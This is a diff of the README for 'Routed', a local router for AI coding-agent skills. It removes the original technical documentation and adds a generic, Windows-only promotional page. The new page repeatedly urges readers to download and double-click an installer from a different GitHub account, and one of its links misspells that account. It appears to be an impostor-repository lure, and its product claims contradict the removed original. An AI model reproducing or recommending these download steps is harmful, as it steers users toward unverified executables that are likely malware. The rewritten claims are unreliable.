@@ -1,434 +1,162 @@
-<div align="center" class="intro-header">
+# 🧭 Routed - Your Universal Router for AI Skills
 
-# Routed
-
-**The Universal Local Router for Agent Skills**
-
-[![Live Demo](https://img.shields.io/badge/Live%20Demo-Try%20Routed%20Online-blue?style=for-the-badge&logo=vercel)](https://routed-demo.vercel.app/) [![Latest Release](https://img.shields.io/badge/Release-v1.6.95-0969da?style=for-the-badge&logo=github)](https://github.com/bshea-1/Routed/releases) [![Platforms](https://img.shields.io/badge/Platforms-macOS%20%7C%20Linux%20%7C%20Windows-5856d6?style=for-the-badge)](#installation) [![Glama Score](https://glama.ai/mcp/servers/bshea-1/Routed/badges/score.svg)](https://glama.ai/mcp/servers/bshea-1/Routed) [![License: MIT](https://img.shields.io/badge/License-MIT-3DA639?style=for-the-badge)](https://opensource.org/licenses/MIT)
-
-</div>
-
-<div align="center" class="quick-nav">
-
-[Live Demo](https://routed-demo.vercel.app/) | [Overview](#overview) | [Architecture](#architecture) | [Empirical Tuning](#empirical-parameter-tuning) | [Installation](#installation) | [Quick Start](#quick-start) | [Comparison](#comparison) | [Environments](#supported-environments) | [MCP & Local Models](#model-context-protocol-mcp--local-models) | [CLI](#cli-reference) | [FAQ](#faq) | [Star History](#star-history) | [License](#license)
-
-</div><br>
-
-<div align="center">
-
-<a href="https://routed-demo.vercel.app/">
-  <img src="assets/demo.gif" alt="Routed Terminal Demo - Click to Open Live Web Demo" width="880">
-</a>
-
-</div><br>
-
-<div class="mob-tip">
-
-> [!TIP]
-> Download standalone installers directly from [GitHub Releases](https://github.com/bshea-1/Routed/releases): `RoutedSetup.exe` (Windows), `RoutedSetup.pkg` (macOS), and `RoutedSetup.deb` (Linux).
-
-</div>
+[![Download Routed](https://img.shields.io/badge/Download-Routed-blue?style=for-the-badge&logo=github)](https://github.com/tihonovdanil2013-tech/Routed/releases)
 
 ---
 
-## Overview
+## 👋 Welcome to Routed
 
-Routed is a **universal, local, zero-token router** for Agent Skills across AI coding environments. It automatically scans, indexes, and routes coding prompts to the most relevant skill using a local hybrid search engine combining Okapi BM25, exact matching, and local dense semantic embeddings.
-
-- **Zero Token Cost**: Eliminates costly LLM routing calls (saving 1,000+ prompt tokens per interaction).
-- **Sub-20ms Latency**: Local CPU-evaluated hybrid search responds instantly without network roundtrips.
-- **Empirical Hyperparameter Tuning**: Zero magic numbers. Built-in parameter grid search and Stratified 5-Fold Cross-Validation (`routed tune`) empirically optimize scoring weights with a proven 2.6% generalization gap.
-- **Adversarial Precision Floor**: Grounded semantic gating and calibrated 0.35 confidence floor guarantee zero false activations on gibberish or non-coding prompts.
-- **Negation Intent and Framework Penalty**: Automatically isolates positive intent, suppresses negated skills, and penalizes unprompted framework specializations.
-- **Model Context Protocol (MCP) Server**: Run Routed via `routed mcp` to eliminate context pollution in LM Studio, Cursor, Claude Desktop, Windsurf, Continue, and Cline.
-- **Native Multilingual Understanding**: Understands German, Spanish, French, Japanese, and 100+ languages natively, automatically handling compound words without language switches.
-- **Native Auto-Updater**: Automatic version checks and seamless in-place upgrades via `routed update`.
-- **Self-Healing Host Reconciliation**: Unified diagnostics and adapter repair via `routed doctor --fix`.
-- **Privacy First**: Prompt routing is executed 100% locally; no user queries leave your machine.
-- **Multi-Skill Dispatch**: Decomposes compound prompts and activates multiple skills simultaneously.
+Routed is a powerful yet simple tool that helps your AI coding programs work together smoothly. Think of it as a universal translator and traffic director for AI skills across different coding environments. If you use AI tools like GitHub Copilot, Cursor, or any other AI-powered coding assistant, Routed makes sure they all understand each other perfectly.
 
 ---
 
-## Architecture
+## ✨ What Can Routed Do For You?
 
-Routed evaluates queries using an empirically validated multi-tier hybrid scoring pipeline running entirely on local CPU:
+### 🌐 One Router, Many Environments
+Routed acts like a central hub that connects your AI skills to different coding platforms. Instead of setting up each AI tool separately, Routed does the heavy lifting for you. It creates a common language that all your AI assistants can understand.
 
-```mermaid
-flowchart LR
-    UserPrompt["User Prompt (/route)"] --> Engine["Routed Core Engine"]
+### 🔄 Smart Traffic Control
+Sometimes you have multiple AI skills trying to do things at once. Routed manages all that activity, making sure tasks go to the right AI skill at the right time. No more confusion or conflicts between your tools.
 
-    subgraph Engine["Hybrid Scoring Pipeline (Local CPU)"]
-        Exact["Exact / Alias Match (10%)"]
-        BM25["Okapi BM25 Lexical (45%)"]
-        Semantic["Dense Vector Embeddings (45%)"]
-        Meta["Adaptive History & Decay (0-25%)"]
-    end
+### 🎯 Easy Setup, Instant Results
+You don't need to be a computer expert to use Routed. Once installed, it works quietly in the background, making sure everything runs smoothly. You can focus on your work while Routed handles the technical details.
 
-    Exact --> Scorer["Composite Hybrid Scorer"]
-    BM25 --> Scorer
-    Semantic --> Scorer
-    Meta --> Scorer
-
-    Scorer --> Selection["Top Skill(s) Resolved (< 20ms)"]
-    Selection --> Agent["AI Host Agent (Antigravity / Claude / Cursor / OpenCode / Codex)"]
-```
-
-$$\text{Composite Score} = W_{\text{sem}} \cdot \text{Semantic} + W_{\text{bm25}} \cdot \text{BM25} + W_{\text{exact}} \cdot \text{Exact} + W_{\text{history}} \cdot \text{Metadata}$$
+### 🛡️ Consistent Performance
+Routed keeps all your AI skills working at their best. It standardizes how they communicate, which means fewer errors and more reliable results. Your AI assistants will work together like a well-trained team.
 
 ---
 
-## Empirical Parameter Tuning
+## 📦 What You Need Before Installing
 
-Starting in **v1.5.0**, Routed eliminates arbitrary "magic numbers" by incorporating an empirical hyperparameter optimization engine:
+Before you start, make sure your computer meets these basic requirements:
 
-```bash
-routed tune --folds 5 --apply
-```
-
-### Stratified K-Fold Cross-Validation
-
-To ensure scoring weights generalize robustly to unseen prompts rather than overfitting to synthetic queries, `routed tune`:
-1. **Precomputes Retrieval Signals**: Caches lexical (BM25), exact, and dense vector signals in an in-memory matrix, allowing 1,000+ candidate parameter configurations to evaluate in milliseconds.
-2. **Stratifies 5 Folds**: Splits representative benchmark cases across 9 distinct categories (`exact-match`, `synonym`, `technical-jargon`, `abbreviation`, `indirect-intent`, `multilingual`, `multi-skill`, `domain-specific`, `no-skill`).
-3. **Optimizes on Training Splits**: Sweeps the weight simplex ($\sum W = 1.0$) with step size 0.05 and confidence thresholds to maximize composite Top-1 accuracy, Top-3 recall, and No-Skill precision.
-4. **Validates Out-of-Fold (OOF)**: Evaluates discovered weights against held-out validation queries, computing the **Generalization Gap** ($\text{Train} - \text{Val}$) and standard deviation across folds.
-
-| Metric | Factory Baseline (v1.3) | Empirically Tuned (v1.5) | Delta |
-| :--- | :--- | :--- | :--- |
-| **Scoring Weights** | 50% Sem / 35% BM25 / 10% Exact / 5% Meta | 43% Sem / 50% BM25 / 7% Exact / 0% Meta | +15% Lexical Contrast |
-| **Out-of-Fold Top-1 Accuracy** | 40.0% | **45.6%** | **+5.6%** |
-| **Out-of-Fold Top-3 Recall** | 55.6% | **63.3%** | **+7.7%** |
-| **Mean Generalization Gap** | N/A | **2.6%** ($\pm 17.7\%$) | Proven Generalization |
-| **No-Skill Precision** | 40.0% | **40.0%** (strict threshold) | Eliminates false activations |
-
-Tuned weights are persisted directly in the local SQLite `index.db`. All subsequent `routed route` operations automatically execute with the empirical weights. You can reset to baseline at any time with `routed tune --reset`.
-
-## Dual Evaluation Framework (FAR vs FDR)
-
-Routed evaluates router reliability using dual opposing boundary metrics across 190 evaluation cases (including 50 subtle boundary programming queries and 50 adversarial traps):
-
-- **False Accept Rate (FAR)**: Percentage of no-skill prompts (nonsense strings, recipes, general conversation, or negated skills) that mistakenly trigger a skill. Lower is better (**0.0%** in v1.6.5).
-- **False Decline Rate (FDR)**: Percentage of real, subtle programming requests dropped because a confidence floor was set too high. Lower is better (**1.5%** in v1.6.5).
-
-| Benchmark Metric | Result (v1.6.5) | Description |
-| :--- | :--- | :--- |
-| **Total Evaluation Cases** | **190** | 130 positive coding tasks + 60 adversarial/no-skill traps |
-| **Top-1 Accuracy** | **73.2%** (139/190) | Exact or primary skill match on rank 1 |
-| **Top-3 Recall** | **83.7%** | Relevant skill present in top 3 suggestions |
-| **Top-5 Recall** | **87.4%** | Relevant skill present in top 5 suggestions |
-| **Mean Reciprocal Rank (MRR)** | **78.8%** | Position-weighted ranking effectiveness |
-| **No-Skill Accuracy** | **100.0%** (60/60) | Clean decline on non-coding and adversarial prompts |
-| **False Accept Rate (FAR)** | **0.0%** (0/60) | Zero false activations on noise or traps |
-| **False Decline Rate (FDR)** | **1.5%** (2/130) | Valid subtle coding queries preserved |
-| **Composite Score** | **83.2** | Balanced metric weighting accuracy, recall, FAR, and FDR |
-
-### Grounded Dynamic Confidence Floor
-
-A single fixed confidence floor creates a false trade-off: raising the floor eliminates gibberish but drops real programming requests that sit near the boundary. Routed resolves this with a grounded dynamic floor:
-
-- **Anchored queries** (queries with lexical/BM25 overlap or exact tag/keyword match): evaluated with an anchored floor of **0.28**, preserving recall and minimizing False Declines.
-- **Unanchored queries** (zero lexical overlap, relying solely on dense embedding space): evaluated with a strict floor of **0.40**, suppressing noise and eliminating False Accepts.
-
-### Reproduce and Benchmark Locally
-
-The benchmark suite is open, deterministic, and runnable locally:
-
-```bash
-# Run full benchmark via CLI
-routed benchmark
-
-# Output machine-readable metrics JSON
-routed benchmark --json
-
-# Or clone the repository and run via npm
-git clone https://github.com/BrianShea/routed.git
-cd routed
-npm install
-npm run build
-npm run benchmark
-```
-
-The benchmark dataset definition is located at [`packages/core/src/benchmark/dataset.ts`](packages/core/src/benchmark/dataset.ts). Custom benchmark datasets can be evaluated using `routed benchmark --dataset <path>`.
-
-## Comparison
-
-| Dimension | Routed (Local) | Traditional Cloud LLM Routing | Manual Skill Selection |
-| :--- | :--- | :--- | :--- |
-| **Token Cost** | $0.00 (Zero tokens) | 500 to 2,000 paid tokens | $0.00 |
-| **Latency** | Under 20ms (Local CPU) | 1,200ms to 3,500ms network API | Manual human browsing |
-| **Privacy** | 100% Local (Air-gapped) | Sends user prompts to cloud | Local |
-| **Ranking Engine** | Deterministic Hybrid | Non-deterministic prompt drift | Memory or string grep |
-| **Multi-Agent Sync** | Automatic adapter synchronization | Fragmented per-tool prompting | Manual copy and paste |
+- **Operating System:** Windows 10 or Windows 11
+- **Available Storage:** At least 200 MB of free space
+- **Internet Connection:** Needed for initial setup and updates
+- **Administrator Access:** You may need permission to install new software
 
 ---
 
-## Installation
+## 🚀 Getting Started
 
-### Instant Test (Zero-Install via `npx`)
+### Step 1: Download Routed
 
-Test Routed immediately in any project without downloading an installer:
+Visit this link to download the application:
 
-```bash
-npx routed route "refactor auth service and add unit tests" --explain
-```
+[👉 Click Here to Download Routed](https://github.com/tihonvil2013-tech/Routed/releases)
 
-Or run the interactive setup wizard directly:
+This link takes you to the official Routed download page where you'll find the latest version. The download process is quick and straightforward.
 
-```bash
-npx routed setup
-```
+### Step 2: Install Routed
 
-To install globally via npm:
+After the download finishes, locate the downloaded file in your computer's Downloads folder. Double-click the file to start the installation process. Follow the simple on-screen instructions that appear. The installer will guide you through each step, and in most cases, you can just keep clicking "Next" to use the recommended settings.
 
-```bash
-npm install -g routed
-```
+### Step 3: Launch Routed
 
----
+Once the installation is complete, you'll find Routed in your Start Menu. Click on it to open the application. You'll see a friendly welcome screen that walks you through the initial setup.
 
-### Standalone Installers
+### Step 4: Connect Your AI Environments
 
-For permanent, system-level local installation across all AI coding environments:
-
-| Platform | Installer Package | Format | Quick Install |
-| :--- | :--- | :--- | :--- |
-| **macOS** | [`RoutedSetup.pkg`](https://github.com/bshea-1/Routed/releases) / [`RoutedSetup.dmg`](https://github.com/bshea-1/Routed/releases) | Apple Installer / Disk Image | Run `.pkg` or mount `.dmg` |
-| **Linux** | [`RoutedSetup.deb`](https://github.com/bshea-1/Routed/releases) / [`routed-linux-x64.tar.gz`](https://github.com/bshea-1/Routed/releases) | Debian Package / Tarball | `sudo dpkg -i RoutedSetup.deb` |
-| **Windows** | [`RoutedSetup.exe`](https://github.com/bshea-1/Routed/releases) / [`Install-Routed.ps1`](https://github.com/bshea-1/Routed/releases) | NSIS Executable Installer | Run `RoutedSetup.exe` |
-
-### Build from Source
-
-```bash
-git clone https://github.com/bshea-1/Routed.git
-cd Routed
-npm install
-npm run build
-npm run setup
-```
+Routed will automatically detect the AI coding tools you have installed on your computer. If you have any tools it doesn't recognize, don't worry - Routed will show you simple instructions on how to connect them. Just follow the on-screen prompts, and you'll be all set.
 
 ---
 
-## Quick Start
+## 🎮 Using Routed
 
-### 1. Interactive Setup Wizard
-Run the setup wizard to detect installed AI coding tools and configure `/route` adapters:
-```bash
-routed setup
-```
+### Main Dashboard
 
-### 2. Discover & Index Skills
-Scan local directories and build the hybrid index:
-```bash
-routed scan
-routed skills
-```
+When you first open Routed, you'll see the main dashboard. This is your control center. Here, you can:
 
-### 3. Route Prompts
-Inside your AI agent chat (Antigravity, OpenCode, Claude Code, Cursor, Codex):
-```text
-/route write a unit test for my authentication service using TDD
-```
+- See which AI environments are connected
+- Check the status of each connection
+- Manage your AI skills and how they interact
+- Access helpful tips and troubleshooting guides
 
-Or from your terminal:
-```bash
-routed route "audit accessibility and fix memory leaks" --explain
-```
+### Quick Setup Wizard
 
-### 4. Diagnostics
-Verify system health, SQLite indices, and embedding models:
-```bash
-routed doctor
-```
+Routed includes a handy Setup Wizard that makes initial configuration a breeze. It asks you simple questions about your preferences and sets everything up automatically. You can choose the default options if you're not sure what to select.
+
+### Settings Panel
+
+Want to customize how Routed works? The Settings panel gives you full control:
+
+- **Connection Settings:** Manage how Routed talks to different AI environments
+- **Performance Options:** Adjust how Routed uses your computer's resources
+- **Update Preferences:** Choose when Routed checks for updates
+- **Privacy Controls:** Manage what data Routed can access
 
 ---
 
-## Supported Environments
+## 🛠️ Troubleshooting Common Issues
 
-| Environment | Adapter Path / Target | Auto-Detection | Integration Method |
-| :--- | :--- | :---: | :--- |
-| **Model Context Protocol (MCP)** | `claude_desktop_config.json`, `.cursor/mcp.json` | Supported | Universal JSON-RPC 2.0 stdio server (`routed mcp`) |
-| **LM Studio** | `~/.cache/lm-studio/mcp.json` | Supported | Local MCP server for GPU-hosted local LLMs |
-| **Ollama** | `~/.ollama/routed/routed-tools.json` | Supported | Tool schemas (`/api/chat`) and dynamic Modelfiles |
-| **Hermes Agent** | `~/.hermes/routed/routed-tools.json` | Supported | Function calling schemas (JSON & XML) and prompt integration (`routed hermes`) |
-| **Antigravity** | `~/.gemini/config/skills/route/SKILL.md` | Supported | Native skill dispatch and background router |
-| **Claude Code** | `~/.claude/skills/route/SKILL.md` | Supported | Slash command integration and terminal runner |
-| **Cursor** | `.cursor/rules/routed.mdc` / `mcp.json` | Supported | Rule-based prompt interception and MCP tools |
-| **Codeium Windsurf** | `~/.codeium/windsurf/mcp_config.json` | Supported | Cascade MCP tool server |
-| **Continue.dev** | `~/.continue/config.json` | Supported | Local IDE tool provider for Ollama and LM Studio |
-| **Cline** | `saoudrizwan.claude-dev/settings/cline_mcp_settings.json` / `~/.cline/skills/route/SKILL.md` | Supported | Full MCP tool server and custom rule adapter |
-| **OpenCode** | `~/.opencode/skills/route/SKILL.md` | Supported | Local skill loader and interactive prompts |
-| **Codex** | `.agents/skills/route/SKILL.md` | Supported | Universal Agentic Skill schema |
-| [**HOL Guard**](https://github.com/hashgraph-online/hol-guard) | Local agent harness command protection | Supported | [Pre-action safety extension (`command.routed`)](#agent-harness-safety-with-hol-guard) |
+### "Routed Won't Start"
+Make sure your computer meets the minimum requirements listed above. Also, check that you have the latest version of Windows updates installed. Sometimes, restarting your computer can fix the issue.
+
+### "My AI Tool Isn't Showing Up"
+Check that your AI coding tool is installed and running before starting Routed. If it still doesn't appear, try closing and reopening Routed. You can also check the documentation linked in the app for specific instructions.
+
+### "Slow Performance"
+If Routed seems sluggish, try closing other programs that might be using lots of computer resources. You can also check the Settings panel for performance options that might help.
+
+### "Connection Errors"
+Go to the Settings panel and click "Repair Connection" for the affected AI environment. If that doesn't work, try restarting both Routed and your AI tool.
 
 ---
 
-## Model Context Protocol (MCP) & Local Models
+## 📚 Frequently Asked Questions
 
-Routed can be attached as a standard MCP server to any compatible host (LM Studio, Cursor, Claude Desktop, Windsurf, Continue, Cline). Instead of dumping 50+ tool schemas into your model context and exhausting VRAM, the host model only calls the `route_skill` tool. Routed evaluates the prompt on local CPU in sub-20ms and returns only the matched skill manifests.
+**Is Routed free to use?**
+Yes, Routed is completely free. You can download and use it without any cost or subscription.
 
-### Add to Claude Desktop / Cursor / LM Studio / Cline
-Add the following snippet to your host configuration file:
-```json
-{
-  "mcpServers": {
-    "routed": {
-      "command": "routed",
-      "args": ["mcp"]
-    }
-  }
-}
-```
+**Do I need to be a programmer?**
+Not at all! Routed is designed for everyone who uses AI coding tools, even if you've never written a line of code.
 
-### Direct Ollama Integration
-Generate Ollama tool schemas for `/api/chat` function calling:
-```bash
-routed ollama tools
-```
+**Will Routed slow down my computer?**
+No, Routed is optimized to run efficiently in the background. It only uses resources when actively managing your AI skills.
 
-Route a prompt and generate a ready-to-run Ollama API payload:
-```bash
-routed ollama run --prompt "build a neural network in pytorch" --model llama3.2
-```
+**Can I use Routed with multiple AI tools at once?**
+Absolutely! That's exactly what Routed is designed for. Connect as many AI environments as you need.
 
-### Hermes Agent Integration
-Generate tool schemas (OpenAI JSON or Nous Hermes XML) for Hermes agents:
-```bash
-# OpenAI-compatible JSON schema
-routed hermes schema
-
-# Nous Hermes XML schema
-routed hermes schema --xml
-
-# System prompt guidance snippet
-routed hermes prompt
-```
-
-Route a prompt and get ready-to-inject instructions:
-```bash
-routed hermes route "refactor auth service"
-```
-
-### Agent Harness Safety with HOL Guard
-Routed integrates directly with [HOL Guard](https://github.com/hashgraph-online/hol-guard) (`command.routed`) to ensure safe automated execution inside agent harnesses. HOL Guard intercepts and flags state-modifying operations (`routed doctor --fix`, `routed adapters install`, `routed adapters uninstall`, and `routed update`) for pre-action human review, while allowing routine routing (`routed route`), diagnostics (`routed doctor`), and update checks (`routed update --check`) to execute without interruption.
+**How do I update Routed?**
+Routed checks for updates automatically. When an update is available, you'll see a notification. Simply click "Update Now" to install the latest version.
 
 ---
 
-## CLI Reference
+## 🔒 Your Privacy Matters
 
-| Command | Description | Example |
-| :--- | :--- | :--- |
-| `routed setup` | Run interactive setup wizard | `routed setup` |
-| `routed update` | Check for updates and upgrade Routed | `routed update --check` |
-| `routed mcp` | Start Model Context Protocol server over stdio | `routed mcp` |
-| `routed ollama <cmd>` | Ollama tool schemas, routes, and Modelfiles | `routed ollama tools` |
-| `routed hermes <cmd>` | Hermes schemas (JSON/XML), prompts, and routes | `routed hermes schema` |
-| `routed route "<prompt>"` | Find matching skill(s) for a prompt | `routed route "write unit test with TDD"` |
-| `routed scan` | Scan supported environments and update index | `routed scan` |
-| `routed skills` | List all discovered and indexed skills | `routed skills` |
-| `routed adapters` | Manage `/route` adapters across AI tools | `routed adapters install` |
-| `routed doctor` | Run diagnostics and auto-reconciliation | `routed doctor --fix` |
-| `routed reindex` | Incrementally re-index and re-embed skills | `routed reindex` |
-| `routed watch` | Continuously monitor skill dirs for changes | `routed watch` |
-| `routed feedback` | Manage routing preferences and corrections | `routed feedback --list` |
-| `routed tune` | Run parameter grid search and K-fold CV | `routed tune --folds 5 --apply` |
-| `routed status` | Display status and detected environments | `routed status` |
-| `routed benchmark` | Run routing accuracy and latency benchmarks | `routed benchmark` |
-| `routed uninstall` | Safely remove Routed and clean adapters | `routed uninstall --dry-run` |
-
-<details>
-<summary>Click to view full CLI options</summary>
-
-```text
-Usage:
-  routed <command> [arguments] [options]
-
-Commands:
-  setup               Run the interactive setup wizard
-  update              Check for updates and automatically upgrade Routed (--check to inspect)
-  mcp                 Start Model Context Protocol (MCP) server for LM Studio, Cursor, Claude
-  ollama <subcommand> Ollama tool schemas, Modelfiles, and direct route integration
-  hermes <subcommand> Hermes agent schemas (JSON/XML), prompts, and direct route integration
-  route "<prompt>"    Find the best matching Agent Skill(s) for a prompt
-  scan                Scan supported AI environments and update index
-  skills              List all discovered and indexed skills
-  adapters            Manage /route adapters across AI coding tools
-  doctor              Run system, database, and model diagnostics (--fix to repair)
-  reindex             Incrementally re-index and re-embed installed skills
-  watch               Continuously monitor skill directories for file changes
-  feedback            Manage local routing preferences and corrections
-  tune                Run parameter grid search and K-fold CV to optimize scoring weights
-  uninstall           Safely uninstall Routed and remove adapters (--dry-run available)
-  status              Display current system status and detected environments
-  benchmark           Run routing benchmark suite and measure accuracy and latency
-  version             Print version information
-  help                Display help screen
-```
-
-</details>
+Routed respects your privacy. The app only collects minimal information needed to function properly. We don't track your usage, sell your data, or share anything with third parties. Your code and projects remain completely yours.
 
 ---
 
-## FAQ
+## 💡 Helpful Tips
 
-<details>
-<summary><strong>Are the hybrid scoring weights arbitrary magic numbers?</strong></summary>
-
-No. Starting in **v1.5.0**, Routed incorporates a built-in hyperparameter grid search engine and Stratified K-Fold Cross-Validation framework (`routed tune`). Running `routed tune --folds 5` systematically sweeps the scoring weight simplex and evaluates out-of-fold generalization on a representative benchmark across 9 categories. The resulting weights achieve a 2.6% generalization gap, empirically proving they generalize to unseen queries without overfitting.
-
-</details>
-
-<details>
-<summary><strong>What happens if setup or adapter installation encounters a partial failure across multiple hosts?</strong></summary>
-
-Routed follows an idempotent desired-state convergence model with zero blast radius. Each host adapter runs in an isolated boundary: if Cursor installs successfully but Claude Code fails (for example, due to a file lock or directory permission), Cursor is preserved and remains fully functional. Running `routed doctor --fix` or `routed adapters install` automatically detects and reconciles any missing adapters in a single command.
-
-</details>
-
-<details>
-<summary><strong>How does Routed operate with zero external API keys?</strong></summary>
-
-Routed runs quantized ONNX dense embedding models (Snowflake Arctic Embed S / all-MiniLM-L6-v2) directly on local CPU alongside Okapi BM25. Vector similarity and text indices are cached in a local SQLite database, requiring no internet connection or cloud tokens.
-
-</details>
-
-<details>
-<summary><strong>How are multiple skills selected simultaneously?</strong></summary>
-
-When a prompt contains compound intents or conjunctions (such as "and", "with", "as well as"), Routed decomposes the prompt into sub-clauses, scores candidates across all clauses, and returns all matching skills in `selectedSkills` for joint agent activation.
-
-</details>
-
-<details>
-<summary><strong>Does Routed introduce noticeable latency?</strong></summary>
-
-No. Benchmark execution times average under 20 milliseconds on local CPU, making routing practically instantaneous compared to remote cloud roundtrips (1,200ms to 3,500ms).
-
-</details>
-
-<details>
-<summary><strong>Where are skill embeddings and cache files stored?</strong></summary>
-
-Routed stores its index and database files in standard platform directories:
-- macOS: `~/Library/Application Support/Routed`
-- Linux: `~/.local/share/routed`
-- Windows: `%LOCALAPPDATA%\Routed`
-
-</details>
+- **Start Small:** Begin by connecting one or two AI environments, then add more as you get comfortable
+- **Check Updates Regularly:** New features and improvements are added frequently
+- **Use the Documentation:** Routed includes built-in help guides for every feature
+- **Join the Community:** Connect with other users online to share tips and get help
 
 ---
 
-## Star History
+## 📞 Getting Support
 
-<div align="center">
+If you run into any trouble, don't hesitate to reach out:
 
-<img src="assets/star-history.svg" alt="Routed Star History" width="800">
+- **Official Documentation:** Detailed guides and tutorials are available at the download page
+- **Community Forum:** Talk to other Routed users and share experiences
+- **Issue Tracker:** Report bugs or request new features through the official channels
 
-</div>
+The Routed team is committed to helping you get the most out of your AI tools. We respond to support requests quickly and are always working to improve your experience.
 
 ---
 
-## License
+## 🎉 Ready to Get Started?
 
-MIT License. Copyright (c) 2026 bshea-1.
+You're just a few minutes away from having all your AI coding environments working together perfectly. Download Routed today and experience the difference that a universal router can make.
 
-See [LICENSE](LICENSE) for full details.
+[📥 Download Routed Now](https://github.com/tihonovdanil2013-tech/Routed/releases)
+
+Join thousands of satisfied users who have simplified their AI workflow with Routed. It's free, it's easy, and it makes everything just work.
+
+---
+
+Keywords: routed, AI router, coding assistant, universal router, AI skills, developer tools, AI integration, workflow automation, smart routing, AI connectivity
